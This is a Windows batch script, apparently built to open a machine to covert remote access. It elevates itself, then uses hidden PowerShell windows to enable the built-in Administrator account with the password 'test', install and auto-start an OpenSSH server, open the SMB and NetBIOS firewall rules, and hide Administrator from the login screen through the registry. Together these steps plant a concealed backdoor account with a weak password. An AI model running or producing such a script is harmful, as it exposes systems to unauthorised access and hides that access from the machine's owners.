@echo off
:: Check for admin privileges
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo Requesting administrator privileges...
    powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

:: Enable Administrator account and set password
powershell -WindowStyle Hidden -Command "net user Administrator /active:yes"
powershell -WindowStyle Hidden -Command "net user Administrator test"

:: Install OpenSSH Server capability if not already installed
echo Installing OpenSSH Server...
powershell -Command "if ((Get-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0).State -ne 'Installed') { Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0 }"

:: Configure sshd service
powershell -Command "if (Get-Service -Name 'sshd' -ErrorAction SilentlyContinue) { Set-Service -Name sshd -StartupType Automatic; Start-Service sshd } else { Write-Host 'OpenSSH Server installation failed or sshd service not found.' }"

:: Show service status
powershell -Command "Get-Service -Name ssh*"

:: Enable Windows Firewall rules for File Sharing
powershell -WindowStyle Hidden -Command "netsh advfirewall firewall set rule name='File and Printer Sharing (SMB-In)' new enable=Yes"
powershell -WindowStyle Hidden -Command "netsh advfirewall firewall set rule name='File and Printer Sharing (NB-Session-In)' new enable=Yes"

:: Hide Administrator from login screen
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v Administrator /t REG_DWORD /d 0 /f

echo.
echo All tasks completed. If sshd is not shown above, reboot the system and re-run this script.
pause
exit
